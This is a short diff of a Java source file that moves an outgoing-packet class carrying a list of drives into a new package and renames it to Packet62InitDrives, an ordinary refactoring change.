@@ -1,16 +1,15 @@
-package com.redpois0n;
+package com.redpois0n.packets.outgoing;
 
 import java.io.DataOutputStream;
 import java.io.File;
 
 import com.redpois0n.common.io.StringWriter;
-import com.redpois0n.packets.outgoing.AbstractOutgoingPacket;
 
-public class Packet62Drives extends AbstractOutgoingPacket {
+public class Packet62InitDrives extends AbstractOutgoingPacket {
 	
 	private File[] drives;
 	
-	public Packet62Drives(File[] drives) {
+	public Packet62InitDrives(File[] drives) {
 		this.drives = drives;
 	}
 
